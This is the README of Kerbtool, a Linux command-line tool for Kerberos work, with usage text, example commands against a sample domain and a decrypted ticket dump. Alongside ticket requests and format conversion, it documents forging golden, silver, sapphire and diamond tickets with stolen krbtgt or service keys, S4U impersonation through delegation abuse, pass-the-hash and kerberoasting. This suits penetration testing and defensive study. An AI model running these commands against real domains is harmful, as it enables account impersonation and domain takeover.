# Kerbtool

## Description
Kerbtool is designed to do a variety of Kerberos related tasks from Linux
such as to request, forge and inspect Kerberos tickets, and to convert
between the CCache and Kirbi ticket cache formats.

Kerbtool is built on top of my fork of the library [gokrb5](https://github.com/jfjallid/gokrb5),
originally created by jcmturner but modified to support the use cases for this
tool.

In scenarios where requesting tickets cross Kerberos realms it might help to
specify the fqdn of the domain controller, a dns server and possibly a krb5.conf
which specifies the KDC to contact for every domain along the way.

In scenarios where tickets are requested via a SOCKS proxy, DNS traffic is
forced to use TCP, but it is also recommended to specify a dns server to use.

## Credits
This project had not been possible without the Kerberos library written by [jcmturner](https://github.com/jcmturner/gokrb5).

Much of the code has been inspired by Impacket's getST.py, getTGT.py,
ticketConverter.py and ticketer.py.

## Contributions
Issues and/or pull requests regarding problems or new features are welcome!

## Usage
```
Usage: kerbtool <service> [options]

<service>:
      --ask-tgt             Request a TGT from the KDC
      --ask-st              Request a Service Ticket from the TGS
      --forge               Craft a TGT or ST using an AES or NT Hash
      --parse               Decrypt and inspect a provided ticket
      --convert             Convert between CCACHE and KIRBI formats
      --kerberoast          Kerberoast specific account based on SPN
  
General options:
  -P, --port <port>           Kerberos Port (default 88)
  -d, --domain <domain>       Domain name to use for login
  -u, --user <username>       Username
  -p, --pass <pass>           Password
      --hash <NT Hash>        Hex encoded NT Hash for user password
  -n, --no-pass               Do not prompt for password
      --dc-ip <ip>            Optionally specify ip of KDC requesting tickets
      --aes-key <AES key>     Use a hex encoded AES128/256 key for Kerberos authentication
      --socks-host <target>   Establish connection via a SOCKS5 proxy server
      --socks-port <port>     SOCKS5 proxy port (default 1080)
      --dns-host <ip:port>    Override system's default DNS resolver 
      --dns-tcp               Force DNS lookups over TCP. Default true when using --socks-host
  -t, --timeout               Dial timeout in seconds (default 5)
      
      --debug                 Enable debug logging
      --verbose               Enable verbose logging
  -v, --version               Show version

```

### AskTGT specific usage
```
Usage: kerbtool --ask-tgt [options]

General options:
  -P, --port <port>           Kerberos Port (default 88)
  -d, --domain <domain>       Domain name to use for login
  -u, --user <username>       Username
  -p, --pass <pass>           Password
      --hash <NT Hash>        Hex encoded NT Hash for user password
  -n, --no-pass               Do not prompt for password
      --dc-ip <ip>            Optionally specify ip of KDC requesting tickets
      --aes-key <AES key>     Use a hex encoded AES128/256 key for Kerberos authentication
      --socks-host <target>   Establish connection via a SOCKS5 proxy server
      --socks-port <port>     SOCKS5 proxy port (default 1080)
      --dns-host <ip:port>    Override system's default DNS resolver 
      --dns-tcp               Force DNS lookups over TCP. Default true when using --socks-host
  -t, --timeout               Dial timeout in seconds (default 5)
      
      --debug                 Enable debug logging
      --verbose               Enable verbose logging
  -v, --version               Show version


options:
      --sign-nt <NT Hash>     Hex encoded NT Hash of key to sign or decrypt ticket with
      --sign-aes <AES key>    Hex encoded AES128/256 key to sign or decrypt ticket with
      --dump-all              Write all tickets to the CCache file
      --out-file <path>       Filename to write requested/forged ticket to (default creds.ccache)
      --inspect               Inspect content of requested, forged or parsed ticket. Requires --sign-nt or --sign-aes
      --request-rc4           Ask for RC4 encrypted encPart of KDC REP, not the actual ticket (default false)
      --krb5-conf <file>      Read krb5.conf file and use as config

```

### AskST specific usage
```
Usage: kerbtool --ask-st [options]

General options:
  -P, --port <port>           Kerberos Port (default 88)
  -d, --domain <domain>       Domain name to use for login
  -u, --user <username>       Username
  -p, --pass <pass>           Password
      --hash <NT Hash>        Hex encoded NT Hash for user password
  -n, --no-pass               Do not prompt for password
      --dc-ip <ip>            Optionally specify ip of KDC requesting tickets
      --aes-key <AES key>     Use a hex encoded AES128/256 key for Kerberos authentication
      --socks-host <target>   Establish connection via a SOCKS5 proxy server
      --socks-port <port>     SOCKS5 proxy port (default 1080)
      --dns-host <ip:port>    Override system's default DNS resolver 
      --dns-tcp               Force DNS lookups over TCP. Default true when using --socks-host
  -t, --timeout               Dial timeout in seconds (default 5)
      
      --debug                 Enable debug logging
      --verbose               Enable verbose logging
  -v, --version               Show version


options:
      --spn <SPN>             SPN used to request or forge a service ticket of format "service/FQDN"
      --sign-nt <NT Hash>     Hex encoded NT Hash of key to sign or decrypt ticket with
      --sign-aes <AES key>    Hex encoded AES128/256 key to sign or decrypt ticket with
      --impersonate <user>    Impersonate target username through S4U. Requires delegation to be setup
      --dump-all              Write all tickets to the CCache file
      --ccache-file <path>    Filename to write requested ticket to (default creds.ccache)
      --inspect               Inspect content of requested, forged or parsed ticket. Requires --sign-nt or --sign-aes
      --request-rc4           Ask for RC4 encrypted encPart of KDC REP, not the actual ticket (default false)
      --alt-service <SPN>     Override sname/SPN in ticket. Works if both services share account password.
      --krb5-conf <file>      Read krb5.conf file and use as config

```

### TicketForger specific usage
```
Usage: kerbtool --forge [options]

General options:
  -P, --port <port>           Kerberos Port (default 88)
  -d, --domain <domain>       Domain name to use for login
  -u, --user <username>       Username
  -p, --pass <pass>           Password
      --hash <NT Hash>        Hex encoded NT Hash for user password
  -n, --no-pass               Do not prompt for password
      --dc-ip <ip>            Optionally specify ip of KDC requesting tickets
      --aes-key <AES key>     Use a hex encoded AES128/256 key for Kerberos authentication
      --socks-host <target>   Establish connection via a SOCKS5 proxy server
      --socks-port <port>     SOCKS5 proxy port (default 1080)
      --dns-host <ip:port>    Override system's default DNS resolver 
      --dns-tcp               Force DNS lookups over TCP. Default true when using --socks-host
  -t, --timeout               Dial timeout in seconds (default 5)
      
      --debug                 Enable debug logging
      --verbose               Enable verbose logging
  -v, --version               Show version


options:
      --target  <username>    Username to put in forged or modified ticket
      --user-rid <RID>        Relative id of --target user
      --domain-sid <SID>      SID of domain to use in forged ticket
      --extra-sids <SID>,..   List of Sids to put in extra sids field of forged ticket
      --groups  <RID>,..      List of group relative ids to but in forged ticket (default 513,512,520,518,519)
      --spn <SPN>             SPN used to forge a service ticket of format "service/FQDN"
      --duration <duration>   Ticket validity duration for crafted tickets. Format 8h, 30m. (default 10h)
      --logon-server <name>   Logon server to populate forged ticket with
      --impersonate <user>    Create a Saphire ticket, impersonating the specified user through Kerberos U2U
      --sign-nt <NT Hash>     Hex encoded NT Hash of key to sign or decrypt ticket with
      --sign-aes <AES key>    Hex encoded AES128/256 key to sign or decrypt ticket with
      --ccache-file <path>    Filename to write requested/forged ticket to (default creds.ccache)
      --inspect               Inspect content of forged ticket. Requires --sign-nt or --sign-aes
      --request-rc4           Ask for RC4 encrypted encPart of KDC REP, not the actual ticket (default false)
      --krb5-conf <file>      Read krb5.conf file and use as config
      --request               Request a TGT and modify it (Diamond ticket)
```

### TicketConverter specific usage
```
Usage: kerbtool --convert [options]
options:
      --in <file>             Path to ticket file to convert from CCACHE/Kirbi
      --out <file>            Path to save converted ticket file. Skip to get output as B64
      --ticket <b64>          B64 string of ticket to convert. Mutually exclusive with --in

      --debug                 Enable debug logging
      --verbose               Enable verbose logging
  -v, --version               Show version
```

### TicketParser specific usage
```
Usage: ./kerbtool --parse [options]

General options:
  -P, --port <port>           Kerberos Port (default 88)
  -d, --domain <domain>       Domain name to use for login
  -u, --user <username>       Username
  -p, --pass <pass>           Password
      --hash <NT Hash>        Hex encoded NT Hash for user password
  -n, --no-pass               Do not prompt for password
      --dc-ip <ip>            Optionally specify ip of KDC requesting tickets
      --aes-key <AES key>     Use a hex encoded AES128/256 key for Kerberos authentication
      --socks-host <target>   Establish connection via a SOCKS5 proxy server
      --socks-port <port>     SOCKS5 proxy port (default 1080)
      --dns-host <ip:port>    Override system's default DNS resolver 
      --dns-tcp               Force DNS lookups over TCP. Default true when using --socks-host
  -t, --timeout               Dial timeout in seconds (default 5)
  
      --debug                 Enable debug logging
      --verbose               Enable verbose logging
  -v, --version               Show version


options:
      --sign-nt <NT Hash>     Hex encoded NT Hash of key to decrypt ticket with
      --sign-aes <AES key>    Hex encoded AES128/256 key to decrypt ticket with
      --ticket <hex>          Hex encoded ticket bytes to inspect
      --in <file>             File with ticket in ccache or kirbi format
```

### Kerberoast specific usage
```
Usage: kerbtool --kerberoast [options]

General options:
  -P, --port <port>           Kerberos Port (default 88)
  -d, --domain <domain>       Domain name to use for login
  -u, --user <username>       Username
  -p, --pass <pass>           Password
      --hash <NT Hash>        Hex encoded NT Hash for user password
  -n, --no-pass               Do not prompt for password
      --dc-ip <ip>            Optionally specify ip of KDC requesting tickets
      --aes-key <AES key>     Use a hex encoded AES128/256 key for Kerberos authentication
      --socks-host <target>   Establish connection via a SOCKS5 proxy server
      --socks-port <port>     SOCKS5 proxy port (default 1080)
      --dns-host <ip:port>    Override system's default DNS resolver 
      --dns-tcp               Force DNS lookups over TCP. Default true when using --socks-host
  -t, --timeout               Dial timeout in seconds (default 5)
      
      --debug                 Enable debug logging
      --verbose               Enable verbose logging
  -v, --version               Show version


options:
      --spn <SPN>             SPN used to request or forge a service ticket of format "service/FQDN"
      --target <username>     Target username to request service ticket for
      --krb5-conf <file>      Read krb5.conf file and use as config
      --request-rc4           Ask for RC4 encrypted encPart of KDC REP, not the actual ticket (default false)
```

## AskTGT
Request a TGT using a password, NT Hash or AES key
```
/kerbtool --ask-tgt --user administrator --domain skynet-ops.corp --pass <pass>
/kerbtool --ask-tgt --user administrator --domain skynet-ops.corp --hash <NT Hash>
/kerbtool --ask-tgt --user administrator --domain skynet-ops.corp --aes-key <AES128/256 hex>
```

## AskST
Request a service ticket for a given SPN using password, NT Hash, AES key or a
CCache file with a TGT for the user when the environment variable KRB5CCNAME
is set:
```
./kerbtool --ask-st --user administrator --domain skynet-ops.corp --pass <pass> --spn cifs/dc01.skynet-ops.corp
./kerbtool --ask-st --user administrator --domain skynet-ops.corp --hash <NT Hash> --spn cifs/dc01.skynet-ops.corp
./kerbtool --ask-st --user administrator --domain skynet-ops.corp --aes-key <AES128/256 hex> --spn cifs/dc01.skynet-ops.corp
./kerbtool --ask-st --user administrator --domain skynet-ops.corp --no-pass --spn cifs/dc01.skynet-ops.corp
```

Override the service name/SPN using the `--alt-service` parameter when both
services are running from the same account.

Impersonate another user via S4U2Self and S4U2Proxy when abusing delegation
with the `--impersonate <username>` parameter.

## Forge tickets
Currently forging of Silver tickets, Golden tickets and Sapphire tickets are supported.

Forge a golden ticket using the krbtgt aes key:
```
./kerbtool --forge --target Administrator --domain skynet-ops.corp --sign-aes <krbtgt AES key> --domain-sid <S-1-5-21-...>
```

Forge a silver ticket using the service account NT hash or AES key to impersonate the Administrator account:
```
./kerbtool --forge --target Administrator --domain skynet-ops.corp --sign-nt <NT Hash> --domain-sid <S-1-5-21-...> --spn cifs/srv01.skynet-ops.local
./kerbtool --forge --target Administrator --domain skynet-ops.corp --sign-aes <AES key> --domain-sid <S-1-5-21-...> --spn cifs/srv01.skynet-ops.local
```

Forge a sapphire ticket to impersonate the Administrator account:
```
./kerbtool --forge --user test --pass <pass> --domain skynet-ops.corp --sign-aes <krbtgt AES key> --domain-sid <S-1-5-21-...> --request --impersonate Administrator
```

## Convert tickets
Convert from CCache to Kirbi and the other way around.
Input and output can be either files on disk or base64 encoded strings as argument and output.

```
./kerbtool --convert --in administrator.ccache --out administrator.kirbi
./kerbtool --convert --in administrator.kirbi --out administrator.ccache
./kerbtool --convert --in administrator.ccache
./kerbtool --convert --ticket BQQADAABAAj/////AAAAAAA... --out administrator.kirbi
./kerbtool --convert --ticket BQQADAABAAj/////AAAAAAA...
```

## Inspect tickets
To inspect a ticket, either provide a ticket from disk in ccache or kirbi
format, or provide a hex encoded ticket as seen in Wireshark.
The signing key argument should be same as was used to create the ticket.
Typically AES256 for realm local ticket and NT Hash for referral tickets.
```
./kerbtool --parse --in administrator.ccache --sign-aes <krbtgt AES256 key> 
```

The output would look something like this:
```
Decrypting ticket with a keytype: 18, key: d7e3794...35
Ticket content:
TktVNO: 5
Realm: SKYNET-OPS.CORP
SName: (type: 2, name: krbtgt/SKYNET-OPS.CORP)
Ticket encrypted part:
  Flags: [Forwardable Renewable Initial PreAuthent EncPARep Canonicalize]
  CRealm: SKYNET-OPS.CORP
  CName: administrator
  CName: (type: 1, name: administrator)
  AuthTime: 2025-06-07 15:54:49 +0000 UTC
  StartTime: 2025-06-07 15:54:49 +0000 UTC
  EndTime: 2025-06-08 01:54:48 +0000 UTC
  RenewTill: 2025-06-09 15:54:48 +0000 UTC
  CAddr: []
  AuthorizationData:
  AuthorizationData[0].ADType: ADIfRelevant
  AuthorizationData[0].ADData[0].ADType: ADWin2KPAC
### PAC ###
PAC.CBuffers: 5
PAC.Version: 0

### KerbValidationInfo ###
LogOnTime: 2025-06-07 15:54:49.5488861 +0000 UTC
LogOffTime: 2185-07-21 23:34:33.709551516 +0000 UTC
KickOffTime: 2185-07-21 23:34:33.709551516 +0000 UTC
PasswordLastSet: 2025-06-07 11:06:16.5506286 +0000 UTC
PasswordCanChange: 2025-06-08 11:06:16.5506286 +0000 UTC
PasswordMustChange: 2185-07-21 23:34:33.709551516 +0000 UTC
EffectiveName: Administrator
FullName: 
LogonScript: 
ProfilePath: 
HomeDirectory: 
HomeDirectoryDrive: 
LogonCount: 32
BadPasswordCount: 0
UserID: 500
PrimaryGroupID: 513
GroupCount: 6
GroupIDs: [{RelativeID:1108 Attributes:7} {RelativeID:513 Attributes:7} {RelativeID:512 Attributes:7} {RelativeID:520 Attributes:7} {RelativeID:518 Attributes:7} {RelativeID:519 Attributes:7}]
UserFlags: 32
UserSessionKey: {CypherBlock:[{Data:[0 0 0 0 0 0 0 0]} {Data:[0 0 0 0 0 0 0 0]}]}
LogonServer: DC01
LogonDomainName: SKYNET-OPS
LogonDomainID: {Revision:1 SubAuthorityCount:4 IdentifierAuthority:[0 0 0 0 0 5] SubAuthority:[21 3301781224 2943037444 2400903060]}
UserAccountControl: 528
SubAuthStatus: 0
LastSuccessfulILogon: 2185-07-21 23:34:33.709551616 +0000 UTC
LastFailedILogon: 2185-07-21 23:34:33.709551616 +0000 UTC
FailedILogonCount: 0
SIDCount: 1
ExtraSIDs: [{SID:{Revision:1 SubAuthorityCount:1 IdentifierAuthority:[0 0 0 0 0 18] SubAuthority:[1]} Attributes:7}]
ResourceGroupDomainSID: {Revision:0 SubAuthorityCount:0 IdentifierAuthority:[0 0 0 0 0 0] SubAuthority:[]}
ResourceGroupCount: 0
ResourceGroupIDs: []

### ClientInfo ###
ClientID: 2025-06-07 15:54:49 +0000 UTC
NameLength: 26
Name: administrator

### ClientClaims ###
<nil>

### ServerChecksum ###
SignatureType: 16
Signature: 3f22c1ae418fcb841ba85270
RODCIdentifier: 0

### KDCChecksum ###
SignatureType: 16
Signature: afd832fa107281815ed8c624
RODCIdentifier: 0

### UPNDNSInfo ###
&{UPNLength:58 UPNOffset:16 DNSDomainNameLength:30 DNSDomainNameOffset:80 Flags:1 SamNameLength:0 SamNameOffset:0 SidLength:0 SidOffset:0 UPN:Administrator@skynet-ops.corp DNSDomain:SKYNET-OPS.CORP SamName: Sid:<nil>}

### PacAttributesInfo ###
<nil>

### PacRequestorSid ###
<nil>

### CredentialsInfo ###
<nil>

### S4UDelegationInfo ###
<nil>

### DeviceInfo ###
<nil>

### DeviceClaimsInfo ###
<nil>

```
## Kerberoast
TODO

Currently only implemented in a limited form as a test.
